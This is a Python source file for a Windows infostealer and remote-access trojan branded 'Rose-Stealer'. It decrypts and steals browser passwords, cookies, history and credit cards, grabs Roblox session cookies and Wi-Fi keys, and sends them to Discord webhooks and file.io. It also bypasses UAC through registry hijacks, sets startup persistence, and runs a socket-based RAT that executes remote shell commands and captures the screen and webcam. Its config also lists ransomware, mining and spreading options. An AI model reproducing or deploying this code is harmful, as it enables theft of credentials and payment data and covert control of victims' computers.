import os
import re
import ctypes
import pygame.camera
import subprocess
import threading
import sys
import platform
import shutil
import sqlite3
import string
import random
import browser_cookie3
import base64
import json
import requests
import psutil
import discord
import winreg
import win32con
import keyboard
import pywifi
import pathlib
import cv2
import aiohttp
import io
import time
import pyttsx3
import webbrowser
import socketio
import uuid
import socket
import pyautogui
import wmi
import GPUtil
import zipfile
import getmac
import errno
from zipfile import ZipFile
from urllib.error import URLError
from pynput.keyboard import Key, Controller
from cryptography.fernet import Fernet
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from win32crypt import CryptUnprotectData
from discord.ext import commands
from sys import argv
from ctypes import byref
from datetime import datetime
from dhooks import File, Embed, Webhook
from base64 import b64decode
from Crypto.Cipher import AES
from urllib.request import Request, urlopen
from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
from json import loads, dumps
from PIL import ImageGrab
from zipfile import ZipFile

class Config:
    def __init__(self):
        self.webhook = 'WEBHOOK_URL'

        self.debug_mode = False

        self.rose_discord_rat = False
        self.rose_discord_rat_socket_link = 'ROSE_DISCORD_RAT_SOCKET_LINK'
        
        self.knight_discord_rat = False
        self.knight_discord_rat_bot_token = 'KNIGHT_DISCORD_RAT_BOT_TOKEN'
        self.knight_discord_rat_channel_id = 'KNIGHT_DISCORD_RAT_CHANNEL_ID'
        self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'

        self.ransomware = False
        self.ransomware_email_adress = 'RANS0MWARE_EMAIL'
        self.ransomware_monero_wallet_adress = 'RANSOMWARE_MONERO_ADRESS_'
        self.ransomware_discord_webhook_url = 'RANSOMWARE_WEBHOOKURL'
        self.ransomware_amount_of_money = 'RANSOMWARE_AMOUNT_0F_MONEY'

        self.discord_ping = False
        self.injection = False
        self.token_stealing = False
        self.browser_stealing = False
        self.deviceinf_stealing = False
        self.ipinf_stealing = False
        self.roblox_stealing = False
        self.screenshot = False
        self.start_up = False
        self.xmr_miner = False
        self.xmr_adress = "wallet_adressss"
        self.fake_error = False
        self.nitro_auto_buy = False
        self.uac_bypass = False
        self.antivm = False
        self.webcam = False
        self.spread_malware = False
        self.spread_malware_msg = "SPRMALWARE_MSFG"
        self.rose_melt_stub = False
        self.games = False
        self.ts_bsod = False
        self.bbcrash = False
        self.disable_protectors = False
        self.block_sites = False

        self.eb_color = 16711680
        self.eb_footer = "Rose-Stealer | t.me/rosegrabber"
        self.wh_avatar = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
        self.wh_name = "Rose-Stealer | t.me/rosegrabber"

    def get_roblox_stealing(self):
        return self.roblox_stealing

    def get_injection(self):
        return self.injection

    def get_token_stealing(self):
        return self.token_stealing 

    def get_browser_stealing(self):
        return self.browser_stealing

    def get_deviceinf_stealing(self):
        return self.deviceinf_stealing

    def get_ipinf_stealing(self):
        return self.ipinf_stealing

    def get_webhook(self):
        return self.webhook

    def get_color(self):
        return self.eb_color

    def get_footer(self):
        return self.eb_footer

    def get_debug_mode(self):
        return self.debug_mode

    def get_avatar(self):
        return self.wh_avatar

    def get_name(self):
        return self.wh_name

    def get_rose_discord_rat(self):
        return self.rose_discord_rat

    def get_rose_discord_rat_link(self):
        return self.rose_discord_rat_socket_link
    
    def get_knight_discord_rat(self):
        return self.knight_discord_rat
    
    def get_knight_discord_rat_bot_token(self):
        return self.knight_discord_rat_bot_token
    
    def get_knight_discord_rat_channel_id(self):
        return self.knight_discord_rat_channel_id
    
    def get_knight_discord_rat_prefix(self):
        return self.knight_discord_rat_prefix
    
    def get_discord_ping(self):
        return self.discord_ping

    def get_screenshot(self):
        return self.screenshot
    
    def get_start_up(self):
        return self.start_up
    
    def get_xmr_miner(self):
        return self.xmr_miner

    def get_xmr_adress(self):
        return self.xmr_adress

    def get_fake_error(self):
        return self.fake_error
    
    def get_nitro_auto_buy(self):
        return self.nitro_auto_buy

    def get_uac_bypass(self):
        return self.uac_bypass

    def get_antivm(self):
        return self.antivm
    
    def get_webcam(self):
        return self.webcam
    
    def get_ransomware_email_adress(self):
        return self.ransomware_email_adress
    
    def get_ransomware_amount_of_money(self):
        return self.ransomware_amount_of_money
    
    def get_ransomware_monero_wallet_adress(self):
        return self.ransomware_monero_wallet_adress
    
    def get_ransomware_discord_webhook_url(self):
        return self.ransomware_discord_webhook_url
    
    def get_ransomware(self):
        return self.ransomware

    def get_spread_malware(self):
        return self.spread_malware
    
    def get_spread_malware_msg(self):
        return self.spread_malware_msg
    
    def get_rose_melt_stub(self):
        return self.rose_melt_stub

    def get_games(self):
        return self.games

    def get_tsbsod(self):
        return self.ts_bsod

    def get_disable_protectors(self):
        return self.disable_protectors

    def get_block_sites(self):
        return self.block_sites

cc = Config()

if platform.system() != "Windows":
    sys.exit()

main_path = os.path.join(os.getenv("APPDATA"), 'roseontop')
webhook = cc.get_webhook()
debug_mode = cc.get_debug_mode()
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()

Threadlist = []
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
username = os.getlogin()

class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def send_error_notification(exception, type):
    webx = _WebhookX().get_object()

    embed = Embed(
        title='Rose Report',
        description='Rose Instance - Error',
        color=eb_color,
        timestamp=datetime.now().isoformat()
    )

    embed.set_author(name=wh_name, icon_url=wh_avatar)
    embed.set_footer(text=eb_footer, icon_url=wh_avatar)
    embed.add_field(name=f"Error in {type} occured | Help us by reporting this bug", value=f'`{exception}`', inline=False)

    webx.send(embed=embed)

class _WebhookX():
    def __init__(self):
        self.webx = Webhook(cc.get_webhook())
        self.webx.modify(name=cc.get_name(), avatar=requests.get(cc.get_avatar()).content)

    def get_object(self):
        return self.webx

def get_random_string(length):
    letters = string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

class Info():
    def __init__(self):
        self.ip = self.get_public_ip()

    def run_command(self, command):
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout = result.stdout.decode('utf-8', errors='replace')
        stderr = result.stderr.decode('utf-8', errors='replace')
        return stdout, stderr

    def get_wifi_profiles(self):
        output, _ = self.run_command('netsh wlan show profiles')
        profile_names = [profile.strip() for profile in output.split(":")]
        return profile_names

    def get_wifi_profile_output(self, profile_name):
        command = f'netsh wlan show profile name="{profile_name}" key=clear'
        output, _ = self.run_command(command)
        return output

    def get_public_ip(self):
        try:
            response = urlopen(Request("https://api.ipify.org"), timeout=10)
            return response.read().decode().strip()
        except URLError:
            return "Unknown"

    def main(self):
        wifi_profiles = self.get_wifi_profiles()
        rndm_strr = get_random_string(25)
        self.path = os.path.join(os.getenv("APPDATA"), 'roseontop', f'wifi_profiles_{rndm_strr}.txt')
        with open(self.path, "w", encoding="utf-8") as file:
            for profile_name in wifi_profiles:
                profile_output = self.get_wifi_profile_output(profile_name)
                file.write(profile_output + "\n")
                file.write("-" * 50 + "\n")

        upload_url = "https://file.io"
        files = {"file": (os.path.basename(self.path), open(self.path, "rb"))}
        response = requests.post(upload_url, files=files)

        if response.status_code == 200:
            self.wif_dwnld_l = response.json().get("link", "Unknown")
        else:
            self.wif_dwnld_l = "Unknown"

    def send_data(self):
        webx = _WebhookX().get_object()

        self.main()

        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json")
            if response.status_code == 200:
                self.ipdata = response.json()
        except Exception:
            return {}

        embed = Embed(
            title='Rose Report',
            description='Rose Instance - IP and WIFI Information',
            color=cc.get_color(),
            timestamp=datetime.now().isoformat()
        )

        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        embed.add_field(name='IP', value=f'`{self.get_public_ip()}`', inline=False)
        embed.add_field(name='Country', value=f'`{self.ipdata.get("country", "Unknown")}`', inline=False)
        embed.add_field(name='City', value=f'`{self.ipdata.get("city", "Unknown")}`', inline=False)
        embed.add_field(name='Postal', value=f'`{self.ipdata.get("postal", "Unknown")}`', inline=False)
        embed.add_field(name='Latitude', value=f'`{self.ipdata.get("loc", "Unknown").split(",")[0]}`', inline=False)
        embed.add_field(name='Longtitude', value=f'`{self.ipdata.get("loc", "Unknown").split(",")[1]}`', inline=False)
        embed.add_field(name='State', value=f'`{self.ipdata.get("region", "Unknown")}`', inline=False)

        embed.add_field(name='WIFI', value=f'[Download]({self.wif_dwnld_l})', inline=False)

        webx.send(embed=embed)
        os.remove(self.path)

    @staticmethod
    def get_username():
        return os.getlogin()

ifx = Info()

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8', errors='ignore'))
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8', errors='ignore'))
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8', errors='ignore'))
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout.decode('utf-8', errors='ignore'))
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []

class Browsers:
    def __init__(self, webhook):
        self.webhook = discord.SyncWebhook.from_url(webhook)

        Chromium()
        Upload(self.webhook)


class Upload:
    def __init__(self, webhook: discord.SyncWebhook):
        self.webhook = webhook

        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs(os.path.join(main_path, "vault"), exist_ok=True)
        if __LOGINS__:
            with open(os.path.join(main_path, "vault", "logins.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open(os.path.join(main_path, "vault", "cookies.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open(os.path.join(main_path, "vault", "web_history.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open(os.path.join(main_path, "vault", "downloads.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open(os.path.join(main_path, "vault", "cards.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile(os.path.join(main_path, "vault.zip"), "w") as zip:
            for file in os.listdir(os.path.join(main_path, "vault")):
                zip.write(os.path.join(main_path, "vault", file), file)

    def send(self):
        self.webhook.send(
            embed=Embed(
                title="Vault",
                description="```" +
                '\n'.join(self.tree(pathlib.Path(os.path.join(main_path, "vault")))) + "```",
                timestamp=datetime.utcnow(),
                color=cc.get_color()
            ),
            file=discord.File(os.path.join(main_path, "vault.zip")),
            username=cc.get_name(),
            avatar_url=cc.get_avatar()
        )

    def clean(self):
        shutil.rmtree(os.path.join(main_path, "vault"))
        os.remove(os.path.join(main_path, "vault.zip"))

    def tree(self, path: pathlib.Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"


class Chromium:
    def __init__(self):
        self.local = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'opera-stable': self.local + '\\Opera Software\\Opera Stable',
            'opera-gx-stable': self.local + '\\Opera Software\\Opera GX Stable',
            'amigo': self.local + '\\Amigo\\User Data',
            'torch': self.local + '\\Torch\\User Data',
            'kometa': self.local + '\\Kometa\\User Data',
            'orbitum': self.local + '\\Orbitum\\User Data',
            'cent-browser': self.local + '\\CentBrowser\\User Data',
            '7star': self.local + '\\7Star\\7Star\\User Data',
            'sputnik': self.local + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.local + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.local + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.local + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.local + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.local + '\\Microsoft\\Edge\\User Data',
            'uran': self.local + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.local + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.local + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.local + '\\Iridium\\User Data',
            'google-chrome-beta': self.local + '\\Google\\Chrome Beta\\User Data',
            'slimjet': self.local + '\\Slimjet\\User Data',
            'maxthon3': self.local + '\\Maxthon3\\User Data',
            'thorium': self.local + '\\Thorium\\User Data',
            'avast-secure-browser': self.local + '\\AVAST Software\\Avast Secure Browser\\User Data',
            'cyberfox': self.local + '\\8pecxstudios\\Cyberfox\\User Data',
            'waterfox': self.local + '\\Waterfox\\Profiles',
            'pale-moon': self.local + '\\Moonchild Productions\\Pale Moon\\Profiles',
            'comodo-dragon': self.local + '\\Comodo\\Dragon\\User Data',
            'coowon': self.local + '\\Coowon\\User Data',
            'icecat': self.local + '\\GNU\\IceCat\\Profiles',
            'basilisk': self.local + '\\Moonchild Productions\\Basilisk\\Profiles',
            'otter-browser': self.local + '\\Otter\\Browser\\User Data',
            'opium': self.local + '\\WebDir\\Opium\\User Data',
            'chromodo': self.local + '\\Comodo\\Chromodo\\User Data',
            'yandex-browser-beta': self.local + '\\Yandex\\YandexBrowserBeta\\User Data',
            'srware-iron': self.local + '\\SRWare Iron\\User Data',
            'qutebrowser': self.local + '\\qutebrowser',
            'edge-sxs': self.local + '\\Microsoft\\Edge SxS\\User Data',
            'vivaldi-snapshot': self.local + '\\VivaldiSnapshot\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = self.decrypt_password(row[3], self.master_key)
                __COOKIES__.append(Types.Cookie(
                    row[0], row[1], row[2], cookie, row[4]))

            conn.close()
        except Exception as e:
            print(e)

        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.timestamp}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()

class Startup():
    def __init__(self):
        self.dir_name = 'rose'
        self.working_dir = os.path.join(os.getenv('APPDATA'), self.dir_name)
        self.exec_name = f'rose.exe'
        self.full_path = os.path.join(self.working_dir, self.exec_name)
        self.reg_entry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        self.regent_name = 'rose'

        self.mkdir()
        self.copy_stub()
        self.regedit()

    def mkdir(self):
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)

    def copy_stub(self):
        shutil.copy2(os.path.realpath(sys.executable), self.full_path)

    def regedit(self):
        subprocess.run(args=f'reg delete "{self.reg_entry}" /v {self.regent_name} /f', shell=True)
        subprocess.run(args=f'reg add "{self.reg_entry}" /v {self.regent_name} /t REG_SZ /d "{self.full_path}" /f', shell=True)

class RobloxX():
    
    def __init__(self):
        self.web = _WebhookX().get_object()
        self.cc = Config()

    def UploadRobloxCookie(self, roblox_cookie):
        
        try:
            info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).json()


            json = {
                "embed": {
                    "description": "Roblox Cookie Grabber:",
                    "color": 13395456,
                    "timestamp": "now",
                    "author": {
                    "name": self.cc.get_name(),
                    "icon_url":  self.cc.get_avatar()
                    },
                    "footer": {
                    "text":  self.cc.get_footer(),
                    "icon_url":  self.cc.get_avatar()
                    },
                    "fields": [
                    {
                        "name": "User ID:",
                        "value": "`" + info["UserID"] + "`"
                    },
                    {
                        "name": "Username:",
                        "value": "`" + info["UserName"] + "`"
                    },
                    {
                        "name": "Robux Balance:",
                        "value": "`" + info["RobuxBalance"] + "`"
                    },
                    {
                        "name": "IsPremium:",
                        "value": "`" + info["IsPremium"] + "`"
                    },
                    {
                        "name": "ROBLOSECURITY:",
                        "value": "Roblox Cookie ```" + roblox_cookie + "```"
                    }
                    ],
                    "image": {
                    "url": info["ThumbnailUrl"]
                    }
                }
            }
            
            requests.self(self.web,json=json)
        except:
            pass
    
    
    def RobloxCookieGrabber(self):
        
  
        browsers = [
            browser_cookie3.chrome,
            browser_cookie3.firefox,
            browser_cookie3.librewolf,
            browser_cookie3.opera,
            browser_cookie3.edge,
            browser_cookie3.chromium,
            browser_cookie3.brave,
            browser_cookie3.vivaldi,
            browser_cookie3.safari
        ]
        
        
        for browser in browsers:
            try:
                cookies = browser(domain_name='roblox.com')
                cookies = str(cookies)
                cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                self.UploadRobloxCookie(cookie)
            except:pass

    def run(self):
        self.RobloxCookieGrabber()

sio = socketio.Client()

class CommandHandler():
    def __init__(self):
        self.webhook = _WebhookX().get_object()
        self.keyboard = Controller()

    def screenshot(self):
        screenshot = ImageGrab.grab()
        file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
        screenshot.save(f"temp_{file_name}.png")
        file = File(f"temp_{file_name}.png", name='Rose-Injector Screenshot.png')
        self.webhook.send(file=file)
        os.remove(f"temp_{file_name}.png")

    @staticmethod
    def messagebox(message):
        MB_YESNO = 0x04
        MB_HELP = 0x4000
        ICON_STOP = 0x10
        ctypes.windll.user32.MessageBoxW(0, message, "Error", MB_HELP | MB_YESNO | ICON_STOP)

    def shell(self, instruction):
        def _shell():
            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            return output

        try:
            result = str(_shell().stdout.decode('CP437'))
        except Exception as e:
            result = str(f"Error | Advanced log: {e}")

        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'
        )

        embed.set_author(name=f"Shell command result | {instruction}", icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        embed.add_field(name="Result", value=f'`{result}`')

        self.webhook.send(embed=embed)

    def shutdown(self):
        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'
        )

        embed.set_author(name=f"Shutting down the PC", icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        self.webhook.send(embed=embed)
        os.system("shutdown /s /t 1")

    def webcampic(self):
        try:
            cam = cv2.VideoCapture(0)
            s, img = cam.read()
            if s:
                suc, buffer = cv2.imencode(".jpg", img)
                io_buf = io.BytesIO(buffer)
                file = File(io_buf, name='cam.jpg')
                self.webhook.send(file=file)

        except Exception as e:
            embed = Embed(
                description='Rose RAT',
                color=16399677,
                timestamp='now'
            )

            embed.set_author(name=f"WebcamPIC Error", icon_url=cc.get_avatar())
            embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
            embed.add_field(name="Advanced log:", value=f'`{e}`')

            self.webhook.send(embed=embed)

    def volumeup(self):
        for i in range(50):
            self.keyboard.press(Key.media_volume_up)
            self.keyboard.release(Key.media_volume_up)

    def volumedown(self):
        for i in range(50):
            self.keyboard.press(Key.media_volume_down)
            self.keyboard.release(Key.media_volume_down)

    def voice(self, text):
        self.volumeup()
        engine = pyttsx3.init()
        engine.setProperty('rate', 150)
        engine.say(text)
        engine.runAndWait()

    def uptime(self):
        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'
        )

        embed.set_author(name=f"Connection Uptime", icon_url=cc.get_avatar())
        embed.add_field(name="Uptime :", value=datetime.now())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())

        self.webhook.send(embed=embed)

    def screenshare(self):
        def to_execute(self):

            import socketio
            import time
            from zlib import compress
            from mss import mss

            _sio = socketio.Client()

            WIDTH = 1900
            HEIGHT = 1000

            @_sio.event
            def connect():
                while True:
                    with mss() as sct:
                        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

                        while True:
                            img = sct.grab(rect)
                            pixels = compress(img.rgb, 6)

                            size = len(pixels)
                            size_len = (size.bit_length() + 7) // 8
                            final_size_len = bytes([size_len])

                            size_bytes = size.to_bytes(size_len, 'big')
                            final_size_bytes = size_bytes

                            _sio.emit('sending_screenshot', {'data': {
                                'size_len': final_size_len,
                                'size_bytes': final_size_bytes,
                                'pixels': pixels
                            }})
                            time.sleep(0.5)

            _sio.connect(cc.get_rose_discord_rat_link())

        t = threading.Thread(target=to_execute, args=(self,))
        t.run()


cmdhandler = CommandHandler()


@sio.event
def connect():
    start_time = datetime.now()
    sio.emit('rose_connect', {'data': {
        'ip': ifx.get_ip(),
        'username': ifx.get_username(),
        'server': cc.get_rose_discord_rat_link(),
        'webhook': cc.get_webhook(),
        'avatar': cc.get_avatar(),
        'footer': cc.get_footer(),
    }})


@sio.event
def receive_command(data):
    if data['data'] == 'screenshot':
        cmdhandler.screenshot()

    if data['data'].startswith('messagebox') is True:
        cmdhandler.messagebox(data['data'].split('messagebox', 1)[1])

    if data['data'].startswith('shell') is True:
        cmdhandler.shell(data['data'].split('shell', 1)[1])

    if data['data'].startswith('voice') is True:
        cmdhandler.voice(data['data'].split('voice', 1)[1])

    if data['data'] == 'screenshare':
        cmdhandler.screenshare()

    if data['data'] == 'volumemax':
        cmdhandler.volumeup()

    if data['data'] == 'volumezero':
        cmdhandler.volumedown()

    if data['data'] == 'shutdown':
        cmdhandler.shutdown()

    if data['data'] == 'webcampic':
        cmdhandler.webcampic()

    if data["data"] == "uptime":
        cmdhandler.uptime()


@sio.event
def disconnect():
    print("disconnect")


def run_rose_rat():
    sio.connect(cc.get_rose_discord_rat_link())
    sio.wait()

def get_drive_info():
    drive_info = []
    partitions = psutil.disk_partitions()

    for partition in partitions:
        drive = {}
        drive['device'] = partition.device
        drive['mountpoint'] = partition.mountpoint

        try:
            usage = psutil.disk_usage(partition.mountpoint)
            drive['total'] = usage.total
            drive['used'] = usage.used
            drive_info.append(drive)
        except OSError as e:
            continue

    return drive_info

def format_drive_info(drives):
    formatted_info = []
    for drive in drives:
        formatted = (
            f"Drive: {drive['device']} (Mountpoint: {drive['mountpoint']}) - "
            f"Total Space: {drive['total']} bytes - "
            f"Used Space: {drive['used']} bytes"
        )
        formatted_info.append(formatted)
    return " - ".join(formatted_info)

username = str(os.getenv("USERNAME"))
hostname = str(os.environ['COMPUTERNAME'])
hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8", errors="ignore")
wifi_interfaces = pywifi.PyWiFi().interfaces()
iface = wifi_interfaces[0] if wifi_interfaces else None
ssid, bssid = "No result", "No result"
if iface:
    iface.scan()
    for result in iface.scan_results():
        try:
            ssid = result.ssid
            bssid = result.bssid
        except:
            pass 
            # For some reason this may result in an error (https://github.com/DamagingRose/Rose-Grabber/issues/167)
            # pywifi/profile.py already initializes an SSID variable, so why this happens in unknown.

